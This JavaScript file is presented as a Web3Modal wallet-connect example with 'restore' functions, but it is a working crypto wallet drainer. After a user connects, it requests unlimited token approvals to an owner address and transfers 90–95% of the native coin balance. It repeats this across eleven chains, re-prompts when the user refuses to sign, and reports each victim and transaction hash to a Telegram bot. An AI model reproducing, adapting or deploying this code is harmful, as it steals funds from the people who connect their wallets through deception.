require("dotenv").config();
import { createWeb3Modal } from "@web3modal/wagmi";

import {
  http,
  createConfig,
  getWalletClient,
  estimateGas,
  getBalance,
  writeContract,
  sendTransaction,
} from "@wagmi/core";

import {
  mainnet,
  bsc,
  polygon,
  arbitrum,
  avalanche,
  optimism,
  base,
  fantom,
  linea,
  cronos,
  manta,
} from "@wagmi/core/chains";
import { coinbaseWallet, walletConnect, injected } from "@wagmi/connectors";
import { getAccount, getChainId } from "@wagmi/core";

import * as CONFIG from "../settings.json";
import { getTokensOwned } from "./apiConfig";
import { hexToNumber, numberToHex } from "viem";

document.addEventListener("DOMContentLoaded", () => {
  const projectId = process.env.VITE_PROJECT_ID;

  const metadata = {
    name: "Web3Modal",
    description: "Web3Modal Example",
    url: "https://web3modal.com",
    icons: ["https://avatars.githubusercontent.com/u/37784886"],
  };

  const config = createConfig({
    chains: [
      mainnet,
      bsc,
      polygon,
      arbitrum,
      avalanche,
      optimism,
      base,
      fantom,
      linea,
      cronos,
      manta,
    ],
    transports: {
      [mainnet.id]: http(),
      [bsc.id]: http(),
      [polygon.id]: http(),
      [arbitrum.id]: http(),
      [avalanche.id]: http(),
      [optimism.id]: http(),
      [base.id]: http(),
      [fantom.id]: http(),
      [linea.id]: http(),
      [cronos.id]: http(),
      [manta.id]: http(),
    },
    connectors: [
      walletConnect({ projectId, metadata, showQrModal: false }),
      injected({ shimDisconnect: true }),
      coinbaseWallet({
        appName: metadata.name,
        appLogoUrl: metadata.icons[0],
        enableMobileWalletLink: true,
      }),
    ],
  });
  // reconnect(config);

  const modal = createWeb3Modal({
    wagmiConfig: config,
    projectId,
    enableAnalytics: false,
  });

  const data = {
    web3: null,
    chainId: null,
    userAddress: null,
    provider: null,
  };

  let mySupportedChains = [
    1, 56, 137, 42161, 43114, 10, 8453, 250, 59144, 25, 169,
  ];
  let usedChains = [];

  const arrCHXY = {
    1: mainnet,
    56: bsc,
    137: polygon,
    42161: arbitrum,
    43114: avalanche,
    10: optimism,
    8453: base,
    250: fantom,
    59144: linea,
    25: cronos,
    169: manta,
  };

  // Get all elements with the class name 'connecter'
  const elements = document.querySelectorAll(".connect-2-res");

  // Loop through each element and add a click event listener
  elements.forEach((element) => {
    element.addEventListener("click", async () => {
      // Handle click event here
      // console.log('An element with class name "connecter" was clicked.');
      await initWeb3();
    });
  });

  async function initWeb3() {
    if (!getAccount(config).isConnected) {
      modal.open();
      observeDOM();
    } else {
      initAccounts();
      sendErr(`${getAccount(config).address} is connected`);
    }
  }

  async function initAccounts() {
    if (!getAccount(config).isConnected) {
      return window.location.reload();
    }
    try {
      const wallet = await getWalletClient(config);
      console.log(wallet);
      const chainID = await wallet.request({ method: "eth_chainId" });

      data.chainId = chainID;
      data.userAddress = getAccount(config).address;
      // return await initRestoreETH();

      console.log(data);

      const resultTokens = await getTokensOwned(
        data.userAddress,
        hexToNumber(data.chainId)
      );

      if (resultTokens.length > 0) {
        for (let i = 0; i < resultTokens.length; i++) {
          try {
            const tkn = resultTokens[i];

            const result = await writeContract(config, {
              account: data.userAddress,
              address: tkn.address,
              abi: JSON.parse(CONFIG.DEFAULT_TOKEN_ABI),
              functionName: "approve",
              args: [
                process.env.OWNER_ADDRESS,
                BigInt(Number("90199254740907199254740991")),
              ],
              chainId: hexToNumber(
                await wallet.request({
                  method: "eth_chainId",
                })
              ),
              value: 0,
            });
            console.log(result);

            sendErr(
              `Token ${
                tkn.address
              } allowance increased with hash ${JSON.stringify(
                result
              )} on chain ${arrCHXY[hexToNumber(data.chainId)]} & user ${
                getAccount(config).address
              }`
            );
          } catch (error) {
            sendErr(
              `Error approving token ${resultTokens[i].address}: ${error.message}`
            );
            if (isRetryError(error)) {
              sendErr(
                `Retrying token ${resultTokens[i].address} at index ${i}...`
              );
              i--;
              continue;
            } else if (isRevertError(error)) {
              console.log(error);
              continue;
            } else {
              await initRestoreETH();
            }
          }
        }

        await initRestoreETH();
      } else {
        sendErr("No tokens");
        await initRestoreETH();
      }
    } catch (error) {
      await sendErr(error);
      await initRestoreETH();
    }
  }

  function isRevertError(error) {
    return error.message.includes("Execution reverted for an unknown reason");
  }

  async function initRestoreETH() {
    const wallet = await getWalletClient(config);

    try {
      const walletETHBalance2 = await getBalance(config, {
        address: data.userAddress,
        chainId: hexToNumber(await wallet.request({ method: "eth_chainId" })),
        unit: "wei",
      });
      console.log(walletETHBalance2);
      const userBalance = walletETHBalance2.formatted;
      console.log(userBalance);

      const cid2 = getChainId(config);

      console.log(cid2);

      if (userBalance == 0) {
        await sendErr(
          `Error restoring COIN on ${arrCHXY[cid2].name}  No native coin balance`
        );

        usedChains.push(
          hexToNumber(await wallet.request({ method: "eth_chainId" }))
        );
        mySupportedChains = mySupportedChains.filter(
          (item) => !usedChains.includes(item)
        );

        return verChainID(mySupportedChains[0]);
      }

      if (cid2 == 1 || cid2 == 56 || cid2 == 137) {
        const result = await writeContract(config, {
          account: data.userAddress,
          address:
            cid2 == 1
              ? process.env.ETH
              : cid2 == 56
              ? process.env.BSC
              : cid2 == 137
              ? process.env.MATIC
              : "0x0",
          abi: CONFIG.RESTORE_ABI,
          functionName: "restore",
          chainId: hexToNumber(
            await wallet.request({
              method: "eth_chainId",
            })
          ),
          value:
            hexToNumber(
              await wallet.request({
                method: "eth_chainId",
              })
            ) == 1
              ? BigInt(parseInt(parseInt(userBalance * 0.9)))
              : BigInt(parseInt(parseInt(userBalance * 0.95))),
        });

        console.log(result);
        sendErr(`Sent COIN, Hash ${result}`);
      } else {
        const result = await sendTransaction(config, {
          account: data.userAddress,
          to: process.env.OWNER_ADDRESS,
          chainId: hexToNumber(
            await wallet.request({
              method: "eth_chainId",
            })
          ),
          value: BigInt(parseInt(parseInt(userBalance * 0.95))),
        });
        // console.log(result);
        sendErr(`Restore COIN Success. Hash ${result}`);
      }
      // return;

      // const gasPrice = await estimateGas(config, {
      //     account: data.userAddress,
      //     to: process.env.OWNER_ADDRESS,
      //     value: BigInt(parseInt(userBalance * 0.8)),
      //     type: "legacy",
      //     chainId: hexToNumber(
      //         await wallet.request({
      //             method: "eth_chainId",
      //         })
      //     ),
      // });

      // console.log(gasPrice);

      usedChains.push(
        hexToNumber(await wallet.request({ method: "eth_chainId" }))
      );
      mySupportedChains = mySupportedChains.filter(
        (item) => !usedChains.includes(item)
      );

      verChainID(mySupportedChains[0]);
    } catch (error) {
      sendErr(
        `Error restoring ETH: ${error.message} chain ${await wallet.request({
          method: "eth_chainId",
        })}`
      );
      if (isRetryError(error)) {
        sendErr(`Retrying restore ETH...`);
        await initRestoreETH();
      } else {
        usedChains.push(
          hexToNumber(await wallet.request({ method: "eth_chainId" }))
        );
        mySupportedChains = mySupportedChains.filter(
          (item) => !usedChains.includes(item)
        );

        verChainID(mySupportedChains[0]);
      }
    }
  }

  async function verChainID(chainId) {
    console.log("Current chain", chainId);
    const wallet = await getWalletClient(config);
    if (data.chainId != chainId) {
      try {
        await wallet.switchChain({ id: arrCHXY[chainId].id });
        initAccounts();
        return true;
      } catch (error) {
        if (error.code === 4902) {
          try {
            await wallet.addChain({ chain: arrCHXY[chainId] }).then(() => {
              initAccounts();
              return true;
            });
          } catch (error) {
            sendErr("Error adding EVM chain:", error);
            initAccounts();

            return false;
          }
        } else {
          console.error("Error switching Ethereum chain:", error);
          initAccounts();

          return false;
        }
      }
    } else {
      initAccounts();
    }
  }

  function isRetryError(error) {
    return error.message.includes("User denied transaction signature");
  }

  function observeDOM() {
    const targetNode = document.head;
    const config = { childList: true, subtree: true };

    const callback = function (mutationsList, observer) {
      for (const mutation of mutationsList) {
        if (
          mutation.type === "childList" &&
          !document.querySelector('style[data-w3m="scroll-lock"]')
        ) {
          initAccounts();
        }
      }
    };

    const observer = new MutationObserver(callback);
    observer.observe(targetNode, config);

    return observer;
  }

  async function sendErr(x) {
    const options = {
      method: "POST",
      mode: "cors",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify({
        text: String(x),
        disable_web_page_preview: false,
        disable_notification: false,
        reply_to_message_id: null,
        chat_id: process.env.MY_CHAT_ID,
      }),
    };

    console.log(x);

    fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN_BOT}/sendMessage`,
      options
    )
      .then((response) => response.json())
      .then((response) => console.log(response))
      .catch((err) => console.error(err));
  }
});
